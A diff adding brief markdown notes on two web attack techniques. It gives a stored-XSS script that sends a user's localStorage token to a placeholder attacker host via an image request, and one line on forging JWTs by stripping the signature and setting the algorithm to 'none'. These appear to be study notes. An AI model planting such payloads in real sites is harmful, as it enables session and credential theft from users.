@@ -1,0 +1,14 @@
+# XSS example
+# create a post on a website with embedded javascript that sends localstorage token
+```
+<script>
+var img = new Image;
+img.onload = function(){};
+img.src = "http://attacker-website.com?token" + localStorage.token
+</script>
+```
+
+# jwt manipulation
+```
+strip out the signature from a jwt and set header algorithm to 'none'
+```
